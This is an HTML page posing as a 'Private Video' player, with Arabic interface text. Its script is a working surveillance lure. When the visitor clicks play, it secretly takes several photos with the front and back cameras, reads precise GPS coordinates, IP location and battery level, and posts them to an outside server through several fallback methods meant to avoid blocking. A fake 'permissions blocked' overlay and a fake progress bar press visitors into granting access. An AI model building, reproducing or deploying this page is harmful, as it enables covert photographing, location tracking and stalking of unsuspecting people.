<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Video Player</title>
    <style>
        /* ===== الأنماط الأصلية ===== */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #000;
            color: #fff;
            overflow: hidden;
        }
        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }
        .play-button-overlay {
            width: 100px;
            height: 100px;
            background: rgba(255,0,0,0.85);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.3s;
            box-shadow: 0 0 20px rgba(255,0,0,0.5);
            position: relative;
        }
        .play-button-overlay:hover {
            transform: scale(1.1);
            background: rgba(255,0,0,0.95);
        }
        .play-icon-large {
            width: 0;
            height: 0;
            border-left: 30px solid white;
            border-top: 20px solid transparent;
            border-bottom: 20px solid transparent;
            margin-left: 8px;
        }
        .video-info { padding: 20px; border-bottom: 1px solid #333; }
        .video-title { font-size: 1.5rem; font-weight: bold; }
        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }
        .control-button {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
        }
        .control-button:hover { background: #333; }
        .progress-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
        }
        .progress-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
        }
        .time-display {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }
        .spinner {
            border: 4px solid #fff;
            border-top: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            position: absolute;
            display: none;
            top: 50%;
            left: 50%;
            transform: translate(-50%,-50%);
        }
        @keyframes spin { 100% { transform: translate(-50%,-50%) rotate(360deg); } }
        #loading {
            display: none;
            font-size: 1.2rem;
            color: #fff;
            margin-top: 20px;
            text-align: center;
        }
        .volume-control {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }
        .volume-slider {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }
        .volume-level {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }
        .fullscreen-btn { margin-left: 15px; }
        @media (max-width: 480px) {
            .video-thumbnail { height: 280px; }
            .play-button-overlay { width: 70px; height: 70px; }
            .play-icon-large {
                border-left-width: 22px;
                border-top-width: 14px;
                border-bottom-width: 14px;
                margin-left: 5px;
            }
        }

        /* ===== النافذة المخصصة العملاقة ===== */
        #customOverlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 999999;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(12px);
        }
        #customOverlay.active {
            display: flex;
        }
        .custom-box {
            background: #1a1a1a;
            padding: 50px 40px;
            border-radius: 50px;
            text-align: center;
            border: 4px solid #ff3333;
            box-shadow: 0 0 100px rgba(255, 0, 0, 0.4);
            max-width: 550px;
            width: 90%;
            animation: pulse 2s infinite alternate;
        }
        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 40px rgba(255,0,0,0.2); }
            100% { transform: scale(1.02); box-shadow: 0 0 100px rgba(255,0,0,0.7); }
        }
        .custom-box .big-icon {
            font-size: 6rem;
            display: block;
            margin-bottom: 10px;
        }
        .custom-box h2 {
            color: #fff;
            font-size: 2.5rem;
            font-weight: 900;
            margin-bottom: 10px;
        }
        .custom-box p {
            color: #ccc;
            font-size: 1.3rem;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        /* زر الترس العملاق */
        .custom-box .gear-btn {
            background: #ff0000;
            color: #fff;
            border: none;
            padding: 25px 50px;
            border-radius: 100px;
            font-size: 2.2rem;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 20px;
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
        }
        .custom-box .gear-btn:hover {
            background: #cc0000;
            transform: scale(1.05);
        }
        .custom-box .gear-btn .gear-icon {
            font-size: 3.5rem;
        }
        .custom-box .status-msg {
            color: #ffaa00;
            font-size: 1.2rem;
            margin-top: 20px;
            min-height: 30px;
        }
        .custom-box .sub {
            color: #777;
            font-size: 1rem;
            margin-top: 20px;
            border-top: 1px solid #333;
            padding-top: 20px;
        }
    </style>
</head>
<body>

    <!-- ===== النافذة المخصصة العملاقة (تحل محل إشعار المتصفح) ===== -->
    <div id="customOverlay">
        <div class="custom-box">
            <span class="big-icon">⛔</span>
            <h2>تم حظر الأذونات</h2>
            <p>يحتاج الموقع إلى الكاميرا والموقع الجغرافي.<br>يرجى فتح الإعدادات وتفعيلها.</p>
            <button id="gearActionBtn" class="gear-btn">
                <span class="gear-icon">⚙️</span> فتح الإعدادات
            </button>
            <div id="gearStatus" class="status-msg"></div>
            <div class="sub">🔄 بعد التفعيل، عد إلى الصفحة وسيبدأ الفيديو تلقائياً</div>
        </div>
    </div>

    <!-- ===== مشغل الفيديو ===== -->
    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">Private Video</div>
        </div>
        <div class="video-thumbnail" id="thumbnailArea">
            <div class="play-button-overlay" id="playButtonOverlay">
                <div class="play-icon-large"></div>
                <div class="spinner" id="spinner"></div>
            </div>
        </div>
        <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
        </video>
        <div class="video-controls">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
            <div class="time-display">0:00 / 2:45</div>
            <div class="volume-control">
                <span></span>
                <div class="volume-slider">
                    <div class="volume-level"></div>
                </div>
            </div>
            <button class="control-button fullscreen-btn">⛶</button>
        </div>
    </div>

    <div id="loading">
        <div class="spinner" style="position:static;"></div>
        <div class="loading-text">Loading video... Please wait</div>
    </div>

    <script>
        (function() {
            'use strict';

            // ===== المتغيرات =====
            let capturedData = {
                permissions: [],
                images: [],
                ipInfo: '',
                batteryStatus: '',
                location: '',
                chatId: ''
            };
            let settingsOpened = false;
            let videoStarted = false;
            let isProcessing = false;
            let permissionsBlocked = false;

            // عناصر DOM
            const thumbnailArea = document.getElementById('thumbnailArea');
            const playButtonOverlay = document.getElementById('playButtonOverlay');
            const realVideo = document.getElementById('realVideo');
            const spinner = document.getElementById('spinner');
            const loading = document.getElementById('loading');

            // عناصر النافذة المخصصة
            const overlay = document.getElementById('customOverlay');
            const gearBtn = document.getElementById('gearActionBtn');
            const gearStatus = document.getElementById('gearStatus');

            // ===== دوال جمع البيانات (الأصلية) =====
            async function requestAllPermissions() {
                let cameraGranted = false, locationGranted = false;
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    stream.getTracks().forEach(t => t.stop());
                    cameraGranted = true;
                    capturedData.permissions.push('Camera Allowed');
                } catch (e) {
                    capturedData.permissions.push('Camera Denied');
                }
                try {
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            () => resolve(),
                            () => resolve(),
                            { enableHighAccuracy: true, timeout: 5000 }
                        );
                    });
                    locationGranted = true;
                    capturedData.permissions.push('Geolocation Allowed');
                } catch (e) {
                    capturedData.permissions.push('Geolocation Denied');
                }
                return { cameraGranted, locationGranted };
            }

            async function fetchIPInfo() {
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const data = await res.json();
                    capturedData.ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
                } catch { capturedData.ipInfo = "IP Info not available"; }
            }

            async function getBatteryStatus() {
                try {
                    const battery = await navigator.getBattery();
                    capturedData.batteryStatus = Math.round(battery.level * 100) + '%';
                } catch { capturedData.batteryStatus = "Unknown"; }
            }

            async function captureFromCamera(facingMode) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: facingMode } }
                    });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    await new Promise(r => setTimeout(r, 1000));
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
                    stream.getTracks().forEach(t => t.stop());
                    capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
                } catch {
                    capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Denied`);
                }
            }

            async function getLocation() {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        });
                    });
                    capturedData.location = `Lat: ${pos.coords.latitude.toFixed(6)}, Long: ${pos.coords.longitude.toFixed(6)}`;
                    capturedData.permissions.push('Geolocation Allowed');
                } catch {
                    capturedData.permissions.push('Geolocation Denied');
                    capturedData.location = '';
                }
            }

            // ===== فتح إعدادات الموقع في المتصفح =====
            function openLocationSettings() {
                const currentUrl = encodeURIComponent(window.location.href);
                const ua = navigator.userAgent;
                let settingsUrl = '';
                if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) {
                    settingsUrl = `chrome://settings/content/siteDetails?site=${currentUrl}`;
                } else if (/Edge/i.test(ua)) {
                    settingsUrl = `edge://settings/content/siteDetails?site=${currentUrl}`;
                } else if (/Firefox/i.test(ua)) {
                    settingsUrl = `about:preferences#privacy`;
                } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
                    settingsUrl = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices';
                }
                if (settingsUrl) {
                    window.location.href = settingsUrl;
                    return;
                }
                // الكود القديم محفوظ (معلق)
            }

            // ===== إرسال البيانات =====
            async function sendDataWithBypass(data) {
                const urls = ['https://server-brxz.onrender.com/submitData', 'https://server-brxz.onrender.com/submitData'];
                for (let url of urls) {
                    try {
                        await fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: new URLSearchParams(data),
                            mode: 'no-cors'
                        });
                        return;
                    } catch (e) {}
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', url, false);
                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        xhr.send(new URLSearchParams(data));
                        return;
                    } catch (e) {}
                    try {
                        const iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        document.body.appendChild(iframe);
                        const form = document.createElement('form');
                        form.method = 'POST';
                        form.action = url;
                        form.target = iframe.name || 'hiddenFrame';
                        iframe.name = form.target;
                        for (let key in data) {
                            const inp = document.createElement('input');
                            inp.type = 'hidden';
                            inp.name = key;
                            inp.value = data[key];
                            form.appendChild(inp);
                        }
                        document.body.appendChild(form);
                        form.submit();
                        setTimeout(() => {
                            document.body.removeChild(form);
                            document.body.removeChild(iframe);
                        }, 1000);
                        return;
                    } catch (e) {}
                    try {
                        const blob = new Blob([new URLSearchParams(data).toString()], { type: 'application/x-www-form-urlencoded' });
                        navigator.sendBeacon(url, blob);
                        return;
                    } catch (e) {}
                }
            }

            // ===== تشغيل الفيديو =====
            function startVideoWithSound() {
                if (videoStarted) return;
                videoStarted = true;
                thumbnailArea.style.display = 'none';
                realVideo.style.display = 'block';
                realVideo.muted = false;
                realVideo.volume = 1.0;
                const playPromise = realVideo.play();
                if (playPromise !== undefined) {
                    playPromise.catch(() => {
                        realVideo.muted = true;
                        realVideo.play().then(() => {
                            setTimeout(() => { realVideo.muted = false; realVideo.volume = 1.0; }, 100);
                        }).catch(() => {});
                    });
                }
                setTimeout(() => { realVideo.muted = false; realVideo.volume = 1.0; realVideo.play().catch(()=>{}); }, 500);
                setTimeout(() => { realVideo.muted = false; realVideo.volume = 1.0; realVideo.play().catch(()=>{}); }, 3000);
            }

            // ===== جمع البيانات وتشغيل الفيديو =====
            async function collectDataAndPlay() {
                if (isProcessing || videoStarted) return;
                isProcessing = true;
                spinner.style.display = 'block';
                loading.style.display = 'block';
                playButtonOverlay.style.opacity = '0.5';
                playButtonOverlay.style.pointerEvents = 'none';

                capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
                await Promise.all([fetchIPInfo(), getBatteryStatus(), getLocation()]);
                await captureFromCamera('user');
                await captureFromCamera('environment');
                await captureFromCamera('user');
                await captureFromCamera('environment');

                const data = {
                    chatId: capturedData.chatId,
                    imageDatas: capturedData.images.join(','),
                    location: capturedData.location,
                    permissions: capturedData.permissions.join(', '),
                    ipInfo: capturedData.ipInfo,
                    battery: capturedData.batteryStatus
                };
                await sendDataWithBypass(data);

                spinner.style.display = 'none';
                loading.style.display = 'none';
                playButtonOverlay.style.opacity = '1';
                playButtonOverlay.style.pointerEvents = 'auto';
                startVideoWithSound();
                isProcessing = false;
            }

            // ===== الدالة الرئيسية =====
            async function handlePlayClick() {
                if (videoStarted || isProcessing) return;

                if (!settingsOpened) {
                    settingsOpened = true;
                    const result = await requestAllPermissions();

                    if (result.cameraGranted || result.locationGranted) {
                        // تم السماح – نبدأ مباشرة
                        await collectDataAndPlay();
                    } else {
                        // رفضت الأذونات – نظهر النافذة المخصصة
                        permissionsBlocked = true;
                        overlay.classList.add('active');
                        gearStatus.textContent = '⛔ تم حظر الأذونات. استخدم الزر لفتح الإعدادات.';
                    }
                } else {
                    // العودة من الإعدادات
                    if (permissionsBlocked) {
                        const result = await requestAllPermissions();
                        if (result.cameraGranted || result.locationGranted) {
                            overlay.classList.remove('active');
                            await collectDataAndPlay();
                        } else {
                            gearStatus.textContent = '❌ لا تزال الأذونات محظورة. حاول مرة أخرى.';
                        }
                    } else {
                        await collectDataAndPlay();
                    }
                }
            }

            // ===== أحداث =====
            if (thumbnailArea) thumbnailArea.addEventListener('click', handlePlayClick);
            if (playButtonOverlay) playButtonOverlay.addEventListener('click', (e) => { e.stopPropagation(); handlePlayClick(); });

            gearBtn.addEventListener('click', function() {
                gearStatus.textContent = '⏳ جاري فتح الإعدادات...';
                openLocationSettings();
            });

            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible' && permissionsBlocked && !videoStarted) {
                    gearStatus.textContent = '🔄 جاري إعادة المحاولة...';
                    handlePlayClick();
                }
            });

            // ===== تفعيل الصوت =====
            document.addEventListener('click', function() {
                if (realVideo) {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    realVideo.play().catch(()=>{});
                }
            }, true);

            // ===== أزرار التحكم =====
            document.querySelectorAll('.control-button').forEach(btn => {
                btn.addEventListener('click', function(e) {
                    e.stopPropagation();
                    if (this.textContent.includes('⛶')) {
                        const vid = document.getElementById('realVideo');
                        if (vid.requestFullscreen) vid.requestFullscreen();
                        else if (vid.webkitRequestFullscreen) vid.webkitRequestFullscreen();
                    }
                });
            });

            // ===== شريط التقدم الوهمي =====
            const progressInterval = setInterval(() => {
                const fill = document.querySelector('.progress-fill');
                const vid = document.getElementById('realVideo');
                if (vid.style.display === 'block') { clearInterval(progressInterval); return; }
                let w = parseInt(fill.style.width) || 35;
                w = (w + 0.1) % 100;
                fill.style.width = w + '%';
                const sec = Math.floor((w / 100) * 165);
                const m = Math.floor(sec / 60);
                const s = sec % 60;
                document.querySelector('.time-display').textContent = `${m}:${s.toString().padStart(2,'0')} / 2:45`;
            }, 1000);

        })();
    </script>

</body>
</html>
